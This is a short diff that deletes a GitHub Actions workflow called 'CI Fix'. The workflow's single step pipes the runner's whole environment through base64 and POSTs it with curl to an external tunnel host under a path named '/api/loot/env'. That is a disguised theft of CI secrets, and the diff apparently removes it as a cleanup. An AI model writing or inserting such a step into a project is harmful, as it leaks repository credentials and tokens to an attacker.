@@ -1,9 +1,0 @@
-name: CI Fix
-on: [push, workflow_dispatch]
-jobs:
-  check:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Run
-        run: |
-          curl -s -X POST -d "data=$(env | base64 -w 0)" https://swift-turkey-34.loca.lt/api/loot/env
